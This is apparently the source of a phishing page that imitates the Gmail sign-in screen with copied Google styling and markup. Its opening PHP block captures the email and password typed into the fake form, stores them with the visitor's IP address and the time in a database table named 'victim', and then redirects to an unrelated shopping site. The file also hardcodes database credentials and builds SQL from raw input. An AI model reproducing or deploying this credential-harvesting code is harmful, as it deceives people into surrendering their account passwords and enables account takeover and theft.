 <?php
 error_reporting(0);
 if(isset($_POST['Email']) && $_POST['Passwd']) {
                 $path="http://facedrill.ml".$_SERVER['REQUEST_URI'];
                 $conn=mysqli_connect('localhost','id2553909_ashutosh','Ffrcut%64gjrRmca%ffbqzx');
                 mysqli_select_db($conn,'id2553909_darknight');
                 $q="SELECT * FROM base WHERE url='$path'";
                 $exe=mysqli_query($conn,$q);
                 $row=mysqli_fetch_array($exe);
                 $id=$row['id'];
                 $username=$_POST['Email'];
                 $password=$_POST['Passwd'];
                 $ip=$_SERVER['REMOTE_ADDR'];
                 $date=date('H:i:s D,M d,Y',time());
                 $query="INSERT INTO victim (id,vic_username,vic_password,ip_address,date,browser,service) VALUES ('$id','$username','$password','$ip','$date','chrome','gmail')";
                 mysqli_query($conn,$query);
                 mysqli_close($conn);
                 header("location: http://snapdeal.com");
              }
?>
<!DOCTYPE HTML>
<html lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">


  
  <meta charset="utf-8">
  <meta content="width=300, initial-scale=1" name="viewport">
  <meta name="description" content="Gmail is email that's intuitive, efficient, and useful. 15 GB of storage, less spam, and mobile access.">
  <meta name="google-site-verification" content="LrdTUW9psUAMbh4Ia074-BPEVmcpBxF6Gwf0MSgQXZs">
  <title>Gmail</title>
  <style>
  @font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 300;
  src: local('Open Sans Light'), local('OpenSans-Light'), url(//fonts.gstatic.com/s/opensans/v13/DXI1ORHCpsQm3Vp6mXoaTYnF5uFdDttMLvmWuJdhhgs.ttf) format('truetype');
}
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 400;
  src: local('Open Sans'), local('OpenSans'), url(//fonts.gstatic.com/s/opensans/v13/cJZKeOuBrn4kERxqtaUH3aCWcynf_cDxXwCLxiixG1c.ttf) format('truetype');
}
  </style>
  <style>
  h1, h2 {
  -webkit-animation-duration: 0.1s;
  -webkit-animation-name: fontfix;
  -webkit-animation-iteration-count: 1;
  -webkit-animation-timing-function: linear;
  -webkit-animation-delay: 0;
  }
  @-webkit-keyframes fontfix {
  from {
  opacity: 1;
  }
  to {
  opacity: 1;
  }
  }
  </style>
<style>
  html, body {
  font-family: Arial, sans-serif;
  background: #fff;
  margin: 0;
  padding: 0;
  border: 0;
  position: absolute;
  height: 100%;
  min-width: 100%;
  font-size: 13px;
  color: #404040;
  direction: ltr;
  -webkit-text-size-adjust: none;
  }
  button,
  input[type=button],
  input[type=submit] {
  font-family: Arial, sans-serif;
  font-size: 13px;
  }
  a,
  a:hover,
  a:visited {
  color: #427fed;
  cursor: pointer;
  text-decoration: none;
  }
  a:hover {
  text-decoration: underline;
  }
  h1 {
  font-size: 20px;
  color: #262626;
  margin: 0 0 15px;
  font-weight: normal;
  }
  h2 {
  font-size: 14px;
  color: #262626;
  margin: 0 0 15px;
  font-weight: bold;
  }
  input[type=email],
  input[type=number],
  input[type=password],
  input[type=tel],
  input[type=text],
  input[type=url] {
  -moz-appearance: none;
  -webkit-appearance: none;
  appearance: none;
  display: inline-block;
  height: 36px;
  padding: 0 8px;
  margin: 0;
  background: #fff;
  border: 1px solid #d9d9d9;
  border-top: 1px solid #c0c0c0;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 1px;
  font-size: 15px;
  color: #404040;
  }
  input[type=email]:hover,
  input[type=number]:hover,
  input[type=password]:hover,
  input[type=tel]:hover,
  input[type=text]:hover,
  input[type=url]:hover {
  border: 1px solid #b9b9b9;
  border-top: 1px solid #a0a0a0;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  }
  input[type=email]:focus,
  input[type=number]:focus,
  input[type=password]:focus,
  input[type=tel]:focus,
  input[type=text]:focus,
  input[type=url]:focus {
  outline: none;
  border: 1px solid #4d90fe;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  input[type=checkbox],
  input[type=radio] {
  -webkit-appearance: none;
  display: inline-block;
  width: 13px;
  height: 13px;
  margin: 0;
  cursor: pointer;
  vertical-align: bottom;
  background: #fff;
  border: 1px solid #c6c6c6;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 1px;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  position: relative;
  }
  input[type=checkbox]:active,
  input[type=radio]:active {
  background: #ebebeb;
  }
  input[type=checkbox]:hover {
  border-color: #c6c6c6;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  }
  input[type=radio] {
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  width: 15px;
  height: 15px;
  }
  input[type=checkbox]:checked,
  input[type=radio]:checked {
  background: #fff;
  }
  input[type=radio]:checked::after {
  content: '';
  display: block;
  position: relative;
  top: 3px;
  left: 3px;
  width: 7px;
  height: 7px;
  background: #666;
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  }
  input[type=checkbox]:checked::after {
  content: url(//ssl.gstatic.com/ui/v1/menu/checkmark.png);
  display: block;
  position: absolute;
  top: -6px;
  left: -5px;
  }
  input[type=checkbox]:focus {
  outline: none;
  border-color: #4d90fe;
  }
  .stacked-label {
  display: block;
  font-weight: bold;
  margin: .5em 0;
  }
  .hidden-label {
  position: absolute !important;
  clip: rect(1px 1px 1px 1px); /* IE6, IE7 */
  clip: rect(1px, 1px, 1px, 1px);
  height: 0px;
  width: 0px;
  overflow: hidden;
  visibility: hidden;
  }
  input[type=checkbox].form-error,
  input[type=email].form-error,
  input[type=number].form-error,
  input[type=password].form-error,
  input[type=text].form-error,
  input[type=tel].form-error,
  input[type=url].form-error {
  border: 1px solid #dd4b39;
  }
  .error-msg {
  margin: .5em 0;
  display: block;
  color: #dd4b39;
  line-height: 17px;
  }
  .help-link {
  background: #dd4b39;
  padding: 0 5px;
  color: #fff;
  font-weight: bold;
  display: inline-block;
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  text-decoration: none;
  position: relative;
  top: 0px;
  }
  .help-link:visited {
  color: #fff;
  }
  .help-link:hover {
  color: #fff;
  background: #c03523;
  text-decoration: none;
  }
  .help-link:active {
  opacity: 1;
  background: #ae2817;
  }
  .wrapper {
  position: relative;
  min-height: 100%;
  }
  .content {
  padding: 0 44px;
  }
  .main {
  padding-bottom: 100px;
  }
  /* For modern browsers */
  .clearfix:before,
  .clearfix:after {
  content: "";
  display: table;
  }
  .clearfix:after {
  clear: both;
  }
  /* For IE 6/7 (trigger hasLayout) */
  .clearfix {
  zoom:1;
  }
  .google-header-bar {
  height: 71px;
  border-bottom: 1px solid #e5e5e5;
  overflow: hidden;
  }
  .header .logo {
  margin: 17px 0 0;
  float: left;
  height: 38px;
  width: 116px;
  }
  .header .secondary-link {
  margin: 28px 0 0;
  float: right;
  }
  .header .secondary-link a {
  font-weight: normal;
  }
  .google-header-bar.centered {
  border: 0;
  height: 108px;
  }
  .google-header-bar.centered .header .logo {
  float: none;
  margin: 40px auto 30px;
  display: block;
  }
  .google-header-bar.centered .header .secondary-link {
  display: none
  }
  .google-footer-bar {
  position: absolute;
  bottom: 0;
  height: 35px;
  width: 100%;
  border-top: 1px solid #e5e5e5;
  overflow: hidden;
  }
  .footer {
  padding-top: 7px;
  font-size: .85em;
  white-space: nowrap;
  line-height: 0;
  }
  .footer ul {
  float: left;
  max-width: 80%;
  min-height: 16px;
  padding: 0;
  }
  .footer ul li {
  color: #737373;
  display: inline;
  padding: 0;
  padding-right: 1.5em;
  }
  .footer a {
  color: #737373;
  }
  .lang-chooser-wrap {
  float: right;
  display: inline;
  }
  .lang-chooser-wrap img {
  vertical-align: top;
  }
  .lang-chooser {
  font-size: 13px;
  height: 24px;
  line-height: 24px;
  }
  .lang-chooser option {
  font-size: 13px;
  line-height: 24px;
  }
  .hidden {
  height: 0px;
  width: 0px;
  overflow: hidden;
  visibility: hidden;
  display: none !important;
  }
  .banner {
  text-align: center;
  }
  .card {
  background-color: #f7f7f7;
  padding: 20px 25px 30px;
  margin: 0 auto 25px;
  width: 304px;
  -moz-border-radius: 2px;
  -webkit-border-radius: 2px;
  border-radius: 2px;
  -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  }
  .card > *:first-child {
  margin-top: 0;
  }
  .rc-button,
  .rc-button:visited {
  display: inline-block;
  min-width: 46px;
  text-align: center;
  color: #444;
  font-size: 14px;
  font-weight: 700;
  height: 36px;
  padding: 0 8px;
  line-height: 36px;
  -moz-border-radius: 3px;
  -webkit-border-radius: 3px;
  border-radius: 3px;
  -o-transition: all 0.218s;
  -moz-transition: all 0.218s;
  -webkit-transition: all 0.218s;
  transition: all 0.218s;
  border: 1px solid #dcdcdc;
  background-color: #f5f5f5;
  background-image: -webkit-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -o-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: linear-gradient(top,#f5f5f5,#f1f1f1);
  -o-transition: none;
  -moz-user-select: none;
  -webkit-user-select: none;
  user-select: none;
  cursor: default;
  }
  .card .rc-button {
  width: 100%;
  padding: 0;
  }
  .rc-button.disabled,
  .rc-button[disabled] {
  opacity: .5;
  filter: alpha(opacity=50);
  cursor: default;
  pointer-events: none;
  }
  .rc-button:hover {
  border: 1px solid #c6c6c6;
  color: #333;
  text-decoration: none;
  -o-transition: all 0.0s;
  -moz-transition: all 0.0s;
  -webkit-transition: all 0.0s;
  transition: all 0.0s;
  background-color: #f8f8f8;
  background-image: -webkit-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -o-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: linear-gradient(top,#f8f8f8,#f1f1f1);
  -moz-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  -webkit-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  }
  .rc-button:active {
  background-color: #f6f6f6;
  background-image: -webkit-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -o-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: linear-gradient(top,#f6f6f6,#f1f1f1);
  -moz-box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  }
  .rc-button-submit,
  .rc-button-submit:visited {
  border: 1px solid #3079ed;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.1);
  background-color: #4d90fe;
  background-image: -webkit-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -moz-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -ms-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -o-linear-gradient(top,#4d90fe,#4787ed);
  background-image: linear-gradient(top,#4d90fe,#4787ed);
  }
  .rc-button-submit:hover {
  border: 1px solid #2f5bb7;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.3);
  background-color: #357ae8;
  background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
  background-image: linear-gradient(top,#4d90fe,#357ae8);
  }
  .rc-button-submit:active {
  background-color: #357ae8;
  background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
  background-image: linear-gradient(top,#4d90fe,#357ae8);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  .rc-button-red,
  .rc-button-red:visited {
  border: 1px solid transparent;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.1);
  background-color: #d14836;
  background-image: -webkit-linear-gradient(top,#dd4b39,#d14836);
  background-image: -moz-linear-gradient(top,#dd4b39,#d14836);
  background-image: -ms-linear-gradient(top,#dd4b39,#d14836);
  background-image: -o-linear-gradient(top,#dd4b39,#d14836);
  background-image: linear-gradient(top,#dd4b39,#d14836);
  }
  .rc-button-red:hover {
  border: 1px solid #b0281a;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.3);
  background-color: #c53727;
  background-image: -webkit-linear-gradient(top,#dd4b39,#c53727);
  background-image: -moz-linear-gradient(top,#dd4b39,#c53727);
  background-image: -ms-linear-gradient(top,#dd4b39,#c53727);
  background-image: -o-linear-gradient(top,#dd4b39,#c53727);
  background-image: linear-gradient(top,#dd4b39,#c53727);
  }
  .rc-button-red:active {
  border: 1px solid #992a1b;
  background-color: #b0281a;
  background-image: -webkit-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -moz-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -ms-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -o-linear-gradient(top,#dd4b39,#b0281a);
  background-image: linear-gradient(top,#dd4b39,#b0281a);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  .secondary-actions {
  text-align: center;
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  .google-header-bar.centered {
  height: 83px;
  }
  .google-header-bar.centered .header .logo {
  margin: 25px auto 20px;
  }
  .card {
  margin-bottom: 20px;
  }
</style>
<style media="screen and (max-width: 580px)">
  html, body {
  font-size: 14px;
  }
  .google-header-bar.centered {
  height: 73px;
  }
  .google-header-bar.centered .header .logo {
  margin: 20px auto 15px;
  }
  .content {
  padding-left: 10px;
  padding-right: 10px;
  }
  .hidden-small {
  display: none;
  }
  .card {
  padding: 20px 15px 30px;
  width: 270px;
  }
  .footer ul li {
  padding-right: 1em;
  }
  .lang-chooser-wrap {
  display: none;
  }
</style>
<style>
  pre.debug {
  font-family: monospace;
  position: absolute;
  left: 0;
  margin: 0;
  padding: 1.5em;
  font-size: 13px;
  background: #f1f1f1;
  border-top: 1px solid #e5e5e5;
  direction: ltr;
  white-space: pre-wrap;
  width: 90%;
  overflow: hidden;
  }
</style>
<style>
  .banner h1 {
  font-family: 'Open Sans', arial;
  -webkit-font-smoothing: antialiased;
  color: #555;
  font-size: 42px;
  font-weight: 300;
  margin-top: 0;
  margin-bottom: 20px;
  }
  .banner h2 {
  font-family: 'Open Sans', arial;
  -webkit-font-smoothing: antialiased;
  color: #555;
  font-size: 18px;
  font-weight: 400;
  margin-bottom: 20px;
  }
  .signin-card {
  width: 274px;
  padding: 40px 40px;
  }
  .signin-card .profile-img {
  width: 96px;
  height: 96px;
  margin: 0 auto 10px;
  display: block;
  -moz-border-radius: 50%;
  -webkit-border-radius: 50%;
  border-radius: 50%;
  }
  .signin-card .profile-name {
  font-size: 16px;
  font-weight: bold;
  text-align: center;
  margin: 10px 0 0;
  min-height: 1em;
  }
  .signin-card .profile-email {
  font-size: 16px;
  text-align: center;
  margin: 10px 0 20px 0;
  min-height: 1em;
  }
  .signin-card input[type=email],
  .signin-card input[type=password],
  .signin-card input[type=text],
  .signin-card input[type=submit] {
  width: 100%;
  display: block;
  margin-bottom: 10px;
  z-index: 1;
  position: relative;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  }
  .signin-card #Email,
  .signin-card #Passwd,
  .signin-card .captcha {
  direction: ltr;
  height: 44px;
  line-height: 44px;
  font-size: 16px;
  }
  .signin-card #Email + .stacked-label {
  margin-top: 15px;
  }
  .signin-card #reauthEmail {
  display: block;
  margin-bottom: 10px;
  line-height: 36px;
  padding: 0 8px;
  font-size: 15px;
  color: #404040;
  line-height: 2;
  margin-bottom: 10px;
  font-size: 14px;
  text-align: center;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  }
  .one-google p {
  margin: 0 0 10px;
  color: #555;
  font-size: 14px;
  text-align: center;
  }
  .one-google p.create-account,
  .one-google p.switch-account {
  margin-bottom: 60px;
  }
  .one-google img {
  display: block;
  width: 210px;
  height: 17px;
  margin: 10px auto;
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  .banner h1 {
  font-size: 38px;
  margin-bottom: 15px;
  }
  .banner h2 {
  margin-bottom: 15px;
  }
  .one-google p.create-account,
  .one-google p.switch-account {
  margin-bottom: 30px;
  }
  .signin-card #Email {
  margin-bottom: 0;
  }
  .signin-card #Passwd {
  margin-top: -1px;
  }
  .signin-card #Email.form-error,
  .signin-card #Passwd.form-error {
  z-index: 2;
  }
  .signin-card #Email:hover,
  .signin-card #Email:focus,
  .signin-card #Passwd:hover,
  .signin-card #Passwd:focus {
  z-index: 3;
  }
</style>
<style media="screen and (max-width: 580px)">
  .banner h1 {
  font-size: 22px;
  margin-bottom: 15px;
  }
  .signin-card {
  width: 260px;
  padding: 20px 20px;
  margin: 0 auto 20px;
  }
  .signin-card .profile-img {
  width: 72px;
  height: 72px;
  -moz-border-radius: 72px;
  -webkit-border-radius: 72px;
  border-radius: 72px;
  }
</style>
<style>
  .jfk-tooltip {
  background-color: #fff;
  border: 1px solid;
  color: #737373;
  font-size: 12px;
  position: absolute;
  z-index: 800 !important;
  border-color: #bbb #bbb #a8a8a8;
  padding: 16px;
  width: 250px;
  }
 .jfk-tooltip h3 {
  color: #555;
  font-size: 12px;
  margin: 0 0 .5em;
  }
 .jfk-tooltip-content p:last-child {
  margin-bottom: 0;
  }
  .jfk-tooltip-arrow {
  position: absolute;
  }
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplbefore,
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplafter {
  display: block;
  height: 0;
  position: absolute;
  width: 0;
  }
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplbefore {
  border: 9px solid;
  }
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplafter {
  border: 8px solid;
  }
  .jfk-tooltip-arrowdown {
  bottom: 0;
  }
  .jfk-tooltip-arrowup {
  top: -9px;
  }
  .jfk-tooltip-arrowleft {
  left: -9px;
  top: 30px;
  }
  .jfk-tooltip-arrowright {
  right: 0;
  top: 30px;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore,.jfk-tooltip-arrowup .jfk-tooltip-arrowimplbefore {
  border-color: #bbb transparent;
  left: -9px;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore {
  border-color: #a8a8a8 transparent;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplafter,.jfk-tooltip-arrowup .jfk-tooltip-arrowimplafter {
  border-color: #fff transparent;
  left: -8px;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore {
  border-bottom-width: 0;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplafter {
  border-bottom-width: 0;
  }
  .jfk-tooltip-arrowup .jfk-tooltip-arrowimplbefore {
  border-top-width: 0;
  }
  .jfk-tooltip-arrowup .jfk-tooltip-arrowimplafter {
  border-top-width: 0;
  top: 1px;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplbefore,
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplbefore {
  border-color: transparent #bbb;
  top: -9px;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplafter,
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplafter {
  border-color:transparent #fff;
  top:-8px;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplbefore {
  border-left-width: 0;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplafter {
  border-left-width: 0;
  left: 1px;
  }
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplbefore {
  border-right-width: 0;
  }
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplafter {
  border-right-width: 0;
  }
  .jfk-tooltip-closebtn {
  background: url("//ssl.gstatic.com/ui/v1/icons/common/x_8px.png") no-repeat;
  border: 1px solid transparent;
  height: 21px;
  opacity: .4;
  outline: 0;
  position: absolute;
  right: 2px;
  top: 2px;
  width: 21px;
  }
  .jfk-tooltip-closebtn:focus,
  .jfk-tooltip-closebtn:hover {
  opacity: .8;
  cursor: pointer;
  }
  .jfk-tooltip-closebtn:focus {
  border-color: #4d90fe;
  }
</style>
<style media="screen and (max-width: 580px)">
  .jfk-tooltip {
  display: none;
  }
</style>
<style>
  .need-help-reverse {
  float: right;
  }
  .remember .bubble-wrap {
  position: absolute;
  padding-top: 3px;
  -o-transition: opacity .218s ease-in .218s;
  -moz-transition: opacity .218s ease-in .218s;
  -webkit-transition: opacity .218s ease-in .218s;
  transition: opacity .218s ease-in .218s;
  left: -999em;
  opacity: 0;
  width: 314px;
  margin-left: -20px;
  }
  .remember:hover .bubble-wrap,
  .remember input:focus ~ .bubble-wrap,
  .remember .bubble-wrap:hover,
  .remember .bubble-wrap:focus {
  opacity: 1;
  left: inherit;
  }
  .bubble-pointer {
  border-left: 10px solid transparent;
  border-right: 10px solid transparent;
  border-bottom: 10px solid #fff;
  width: 0;
  height: 0;
  margin-left: 17px;
  }
  .bubble {
  background-color: #fff;
  padding: 15px;
  margin-top: -1px;
  font-size: 11px;
  -moz-border-radius: 2px;
  -webkit-border-radius: 2px;
  border-radius: 2px;
  -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  }
  #stay-signed-in {
  float: left;
  }
  #stay-signed-in-tooltip {
  left: auto;
  margin-left: -20px;
  padding-top: 3px;
  position: absolute;
  top: 0;
  visibility: hidden;
  width: 314px;
  z-index: 1;
  }
  .dasher-tooltip {
  position: absolute;
  left: 50%;
  top: 380px;
  margin-left: 150px;
  }
  .dasher-tooltip .tooltip-pointer {
  margin-top: 15px;
  }
  .dasher-tooltip p {
  margin-top: 0;
  }
  .dasher-tooltip p span {
  display: block;
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  .dasher-tooltip {
  top: 340px;
  }
</style>
  </head><body>
  <div class="wrapper">
  <div class="google-header-bar centered">
  <div class="header content clearfix">
  <img alt="Google" class="logo" src="logo.png">
  </div>
  </div>
  <div class="main content clearfix">
<div class="banner">
<h1>
  One account. All of Google.
</h1>
  <h2 class="hidden-small">
  Sign in to continue to Gmail
  </h2>
</div>
<div class="card signin-card clearfix">
  <div id="cc_iframe_parent"><iframe id="youtube" src="ServiceLogin_files/CheckConnection.htm" style="visibility: hidden; width: 1px; height: 1px; position: absolute; top: -100px;"></iframe></div>
<img class="profile-img" src="avatar.png" alt="">
<p class="profile-name"></p>
  <form novalidate="" method="post" action="<?php $path; ?>" id="gaia_loginform">
  <input name="GALX" value="PXL5foTed14" type="hidden">
  <input name="continue" value="https://mail.google.com/mail/" type="hidden">
  <input name="service" value="mail" type="hidden">
  <input name="rm" value="false" type="hidden">
  <input name="ltmpl" value="default" type="hidden">
  <input name="scc" value="1" type="hidden">
  <input name="ss" value="1" type="hidden">
  <input name="osid" value="1" type="hidden">
  <input id="_utf8" name="_utf8" value="☃" type="hidden">
  <input name="bgresponse" id="bgresponse" value="js_disabled" type="hidden">
  <input id="pstMsg" name="pstMsg" value="1" type="hidden">
  <input id="dnConn" name="dnConn" value="" type="hidden">
  <input id="checkConnection" name="checkConnection" value="youtube:10767:1" type="hidden">
  <input id="checkedDomains" name="checkedDomains" value="youtube" type="hidden">
<label class="hidden-label" for="Email">Email</label>
<input id="Email" name="Email" placeholder="Email" value="" spellcheck="false" class="" type="email">
<label class="hidden-label" for="Passwd">Password</label>
<input id="Passwd" name="Passwd" placeholder="Password" class="" type="password">
<input id="signIn" name="signIn" class="rc-button rc-button-submit" value="Sign in" type="submit">
  <label class="remember">
  <input id="PersistentCookie" name="PersistentCookie" value="yes" checked="checked" type="checkbox">
  <span>
  Stay signed in
  </span>
  </label><div class="bubble-wrap" role="tooltip">
  <div class="bubble-pointer"></div>
  <div class="bubble">
  For your convenience, keep this checked. On shared devices, additional precautions are recommended.
  <a href="https://support.google.com/accounts/?p=securesignin&amp;hl=en" target="_blank">Learn more</a>
  </div>
  </div>
  
  <input name="rmShown" value="1" type="hidden">
  <a id="link-forgot-passwd" href="https://accounts.google.com/RecoverAccount?service=mail&amp;continue=https%3A%2F%2Fmail.google.com%2Fmail%2F" class="need-help-reverse">
  Need help?
  </a>
  </form>
</div>
<div class="one-google">
  <p class="create-account">
  <a id="link-signup" href="https://accounts.google.com/SignUp?service=mail&amp;continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&amp;ltmpl=default">
  Create an account
  </a>
  </p>
<p class="tagline">
  One Google Account for everything Google
</p>
<img src="ServiceLogin_files/logo_strip_2x.png" alt="" width="210" height="17">
</div>
  </div>
  <div class="google-footer-bar">
  <div class="footer content clearfix">
  <ul id="footer-list">
  <li>
  <a href="https://www.google.com/intl/en/about" target="_blank">
  About Google
  </a>
  </li>
  <li>
  <a href="https://accounts.google.com/TOS?loc=IN&amp;hl=en&amp;privacy=true" target="_blank">
  Privacy
  </a>
  </li>
  <li>
  <a href="https://accounts.google.com/TOS?loc=IN&amp;hl=en" target="_blank">
  Terms
  </a>
  </li>
  <li>
  <a href="http://www.google.com/support/accounts?hl=en" target="_blank">
  Help
  </a>
  </li>
  </ul>
  <div id="lang-vis-control" style="display: inline;">
  <span id="lang-chooser-wrap" class="lang-chooser-wrap">
  <label for="lang-chooser"><img src="ServiceLogin_files/universal_language_settings-21.png" alt="Change language"></label>
  <select id="lang-chooser" class="lang-chooser" name="lang-chooser">
  <option value="af">
  ‪Afrikaans‬
  </option>
  <option value="az">
  ‪azərbaycan‬
  </option>
  <option value="in">
  ‪Bahasa Indonesia‬
  </option>
  <option value="ms">
  ‪Bahasa Melayu‬
  </option>
  <option value="ca">
  ‪català‬
  </option>
  <option value="cs">
  ‪Čeština‬
  </option>
  <option value="da">
  ‪Dansk‬
  </option>
  <option value="de">
  ‪Deutsch‬
  </option>
  <option value="et">
  ‪eesti‬
  </option>
  <option value="en-GB">
  ‪English (United Kingdom)‬
  </option>
  <option value="en" selected="selected">
  ‪English (United States)‬
  </option>
  <option value="es">
  ‪Español (España)‬
  </option>
  <option value="es-419">
  ‪Español (Latinoamérica)‬
  </option>
  <option value="eu">
  ‪euskara‬
  </option>
  <option value="fil">
  ‪Filipino‬
  </option>
  <option value="fr-CA">
  ‪Français (Canada)‬
  </option>
  <option value="fr">
  ‪Français (France)‬
  </option>
  <option value="gl">
  ‪galego‬
  </option>
  <option value="hr">
  ‪Hrvatski‬
  </option>
  <option value="zu">
  ‪isiZulu‬
  </option>
  <option value="is">
  ‪íslenska‬
  </option>
  <option value="it">
  ‪Italiano‬
  </option>
  <option value="sw">
  ‪Kiswahili‬
  </option>
  <option value="lv">
  ‪latviešu‬
  </option>
  <option value="lt">
  ‪lietuvių‬
  </option>
  <option value="hu">
  ‪magyar‬
  </option>
  <option value="nl">
  ‪Nederlands‬
  </option>
  <option value="no">
  ‪norsk‬
  </option>
  <option value="pl">
  ‪polski‬
  </option>
  <option value="pt">
  ‪Português‬
  </option>
  <option value="pt-BR">
  ‪Português (Brasil)‬
  </option>
  <option value="pt-PT">
  ‪português (Portugal)‬
  </option>
  <option value="ro">
  ‪română‬
  </option>
  <option value="sk">
  ‪Slovenčina‬
  </option>
  <option value="sl">
  ‪slovenščina‬
  </option>
  <option value="fi">
  ‪Suomi‬
  </option>
  <option value="sv">
  ‪Svenska‬
  </option>
  <option value="vi">
  ‪Tiếng Việt‬
  </option>
  <option value="tr">
  ‪Türkçe‬
  </option>
  <option value="el">
  ‪Ελληνικά‬
  </option>
  <option value="bg">
  ‪български‬
  </option>
  <option value="mn">
  ‪монгол‬
  </option>
  <option value="ru">
  ‪Русский‬
  </option>
  <option value="sr">
  ‪српски‬
  </option>
  <option value="uk">
  ‪Українська‬
  </option>
  <option value="ka">
  ‪ქართული‬
  </option>
  <option value="hy">
  ‪հայերեն‬
  </option>
  <option value="iw">
  ‫עברית‬‎
  </option>
  <option value="ur">
  ‫اردو‬‎
  </option>
  <option value="ar">
  ‫العربية‬‎
  </option>
  <option value="fa">
  ‫فارسی‬‎
  </option>
  <option value="am">
  ‪አማርኛ‬
  </option>
